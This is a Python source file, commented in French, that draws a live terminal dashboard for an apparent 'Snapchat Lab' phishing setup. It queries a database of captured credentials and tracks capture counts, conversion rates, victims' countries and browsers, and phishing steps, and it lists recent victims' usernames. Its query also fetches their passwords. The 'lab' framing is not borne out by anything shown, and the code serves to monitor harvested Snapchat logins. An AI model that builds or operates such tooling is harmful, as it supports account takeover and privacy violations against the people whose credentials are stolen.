"""
Snapchat Lab — Dashboard Terminal Live (Rich)
Usage:  snapchat-lab dashboard
        python dashboard_terminal.py
"""

import os, sys, sqlite3, json, time
from datetime import datetime
from collections import Counter

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

try:
    from rich.layout import Layout
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.live import Live
    from rich.align import Align
    from rich.console import Console
    from rich import box
except ImportError:
    print("Installation de rich necessaire: pip install rich")
    sys.exit(1)

try:
    from main import CONFIG
except ImportError:
    CONFIG = {"CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db")}

console = Console()
REFRESH_SECONDS = 3

import re


def fetch_stats():
    """Recuperer les stats depuis la DB."""
    db = CONFIG["CAPTURE_DB"]
    if not os.path.exists(db):
        return None

    conn = sqlite3.connect(db)
    c = conn.cursor()

    total = c.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
    today = c.execute(
        "SELECT COUNT(*) FROM captured_credentials WHERE DATE(timestamp) = DATE('now')"
    ).fetchone()[0]
    sessions = c.execute(
        "SELECT COUNT(*) FROM experiment_log WHERE event_type='SESSION_START'"
    ).fetchone()[0]
    votes = c.execute(
        "SELECT COUNT(*) FROM experiment_log WHERE event_type LIKE '%VOTE%'"
    ).fetchone()[0]
    conversion = round(total / sessions * 100, 1) if sessions > 0 else 0.0

    countries_raw = c.execute(
        "SELECT country FROM captured_credentials WHERE country IS NOT NULL AND country != ''"
    ).fetchall()
    countries = Counter(r[0] for r in countries_raw)
    top_countries = countries.most_common(5)

    recent = c.execute(
        """SELECT username, password, timestamp, step, country
           FROM captured_credentials ORDER BY id DESC LIMIT 8"""
    ).fetchall()

    steps = c.execute(
        "SELECT step, COUNT(*) FROM captured_credentials GROUP BY step"
    ).fetchall()

    agents = c.execute(
        "SELECT user_agent FROM captured_credentials WHERE user_agent IS NOT NULL"
    ).fetchall()
    devices = {"Chrome": 0, "Safari": 0, "Firefox": 0, "Other": 0}
    for (ua,) in agents:
        ua_l = (ua or "").lower()
        if "chrome" in ua_l and "chromium" not in ua_l:
            devices["Chrome"] += 1
        elif "safari" in ua_l:
            devices["Safari"] += 1
        elif "firefox" in ua_l:
            devices["Firefox"] += 1
        else:
            devices["Other"] += 1
    total_devices = sum(devices.values())

    conn.close()
    return {
        "total": total,
        "today": today,
        "sessions": sessions,
        "votes": votes,
        "conversion": conversion,
        "countries": top_countries,
        "recent": recent,
        "steps": dict(steps),
        "devices": devices,
        "total_devices": total_devices,
        "time": datetime.now().strftime("%H:%M:%S"),
    }

def build_layout(stats):
    """Construire le layout Rich."""
    if stats is None:
        return Panel(
            Align.center(
                "[yellow]Base de donnees introuvable.\nLance d'abord: snapchat-lab start[/]",
                vertical="middle",
            ),
            title="Snapchat Lab — Dashboard",
            border_style="red",
        )

    kpi_table = Table.grid(padding=(0, 2))
    kpi_table.add_row(
        Panel(f"[bold cyan]{stats['total']}[/]\n[yellow]Total captures[/]", width=20, style="blue"),
        Panel(f"[bold green]{stats['today']}[/]\n[yellow]Aujourd'hui[/]", width=20, style="blue"),
        Panel(f"[bold magenta]{stats['conversion']}%[/]\n[yellow]Conversion[/]", width=20, style="blue"),
        Panel(f"[bold white]{stats['sessions']}[/]\n[yellow]Sessions[/]", width=20, style="blue"),
    )

    countries_table = Table(box=box.SIMPLE, title="[bold]Top Pays[/]", title_justify="left")
    countries_table.add_column("Pays", style="cyan")
    countries_table.add_column("Captures", justify="right", style="green")
    if stats["countries"]:
        for country, count in stats["countries"]:
            countries_table.add_row(country, str(count))
    else:
        countries_table.add_row("(aucune donnee)", "0")

    devices_table = Table(box=box.SIMPLE, title="[bold]Appareils[/]")
    devices_table.add_column("Navigateur", style="cyan")
    devices_table.add_column("%", justify="right", style="green")
    for browser, count in stats["devices"].items():
        pct = round(count / stats["total_devices"] * 100, 1) if stats["total_devices"] > 0 else 0
        devices_table.add_row(browser, f"{pct}%")

    steps_table = Table(box=box.SIMPLE, title="[bold]Par Etape[/]", title_justify="left")
    steps_table.add_column("Etape", style="cyan")
    steps_table.add_column("Captures", justify="right", style="green")
    for step, count in sorted(stats["steps"].items(), key=lambda x: -x[1]):
        steps_table.add_row(step or "?", str(count))

    recent_table = Table(box=box.SIMPLE, title="[bold]Dernieres Captures[/]")
    recent_table.add_column("Username", style="cyan", no_wrap=True)
    recent_table.add_column("Step", style="yellow")
    recent_table.add_column("Pays", style="green")
    recent_table.add_column("Il y a", style="white")
    for r in stats["recent"]:
        username, pw, ts, step, country = r
        display_user = (username or "?")[:18]
        time_ago = ""
        if ts:
            try:
                dt = datetime.strptime(ts, "%Y-%m-%d %H:%M:%S")
                diff = datetime.now() - dt
                mins = int(diff.total_seconds() / 60)
                if mins < 1: time_ago = "a l'instant"
                elif mins < 60: time_ago = f"il y a {mins}m"
                else: time_ago = f"il y a {mins//60}h"
            except:
                time_ago = ts[:10] if ts else ""
        recent_table.add_row(display_user, step or "?", country or "?", time_ago)

    left_col = Table.grid()
    left_col.add_row(countries_table)
    left_col.add_row(devices_table)

    right_col = Table.grid()
    right_col.add_row(Panel(steps_table, border_style="green"))
    right_col.add_row(recent_table)

    main_content = Table.grid()
    main_content.add_row(kpi_table)
    main_content.add_row(Panel(left_col, border_style="dim"), Panel(right_col, border_style="dim"))

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return Panel(
        main_content,
        title="[bold yellow]Snapchat Lab — Live Dashboard[/]",
        subtitle=f"[dim]Derniere mise a jour: {now}[/]",
        border_style="cyan",
    )

def run_dashboard():
    """Lancer le dashboard en boucle live."""
    try:
        with Live(
            console=console,
            screen=True,
            auto_refresh=False,
            refresh_per_second=4,
        ) as live:
            while True:
                stats = fetch_stats()
                layout = build_layout(stats)
                live.update(layout, refresh=True)
                time.sleep(REFRESH_SECONDS)
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Dashboard arrete.[/]")


if __name__ == "__main__":
    run_dashboard()
